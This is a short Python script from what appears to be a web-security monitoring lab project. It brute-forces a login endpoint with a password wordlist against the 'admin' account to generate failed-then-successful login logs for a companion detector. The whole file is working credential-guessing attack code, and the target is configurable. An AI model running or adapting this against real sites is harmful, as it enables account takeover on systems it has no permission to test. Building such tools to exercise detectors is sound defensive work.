"""
brute.py — Brute Force Attack
Web Security Monitoring Project

Tries every password in wordlist.txt against the target site's /login
endpoint, simulating a credential brute-force attack. Generates the
log pattern (rapid FAILs from one IP, then SUCCESS) that the protector
tool's brute-force detector is built to catch.

LOCAL LAB USE ONLY. Only run this against a target you control.
"""

import sys
import time
import argparse
import requests

# --- Fixed lab settings (not exposed as flags, kept simple) ---
USERNAME = "admin"
WORDLIST_PATH = "wordlist.txt"
DELAY = 0.0


def brute_force(target_url):
    with open(WORDLIST_PATH, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Target:   {target_url}/login")
    print(f"[*] Username: {USERNAME}")
    print(f"[*] Passwords to try: {len(passwords)}\n")

    for i, password in enumerate(passwords, start=1):
        try:
            resp = requests.post(
                f"{target_url}/login",
                data={"username": USERNAME, "password": password},
                allow_redirects=False,
                timeout=5,
            )
        except requests.exceptions.ConnectionError:
            print("[!] Could not reach target. Is app.py running?")
            sys.exit(1)

        # The target returns 302 (redirect to dashboard) on success,
        # 401 on failure — that's the signal we check here.
        if resp.status_code == 302:
            print(f"[{i}/{len(passwords)}] {password:<20} -> SUCCESS")
            print(f"\n[+] Valid credentials found: {USERNAME}:{password}")
            return
        else:
            print(f"[{i}/{len(passwords)}] {password:<20} -> fail ({resp.status_code})")

        if DELAY:
            time.sleep(DELAY)

    print("\n[-] Wordlist exhausted, no valid password found.")


def main():
    parser = argparse.ArgumentParser(description="Brute force the lab login endpoint")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP or hostname (with or without port)")
    parser.add_argument("--port", default="5000", help="Target port (ignored if --target already includes one)")
    args = parser.parse_args()

    # If the user already typed a port into --target (e.g. 192.168.1.14:5000),
    # don't double it up with --port.
    if ":" in args.target:
        target_url = f"http://{args.target}"
    else:
        target_url = f"http://{args.target}:{args.port}"

    brute_force(target_url)


if __name__ == "__main__":
    main()
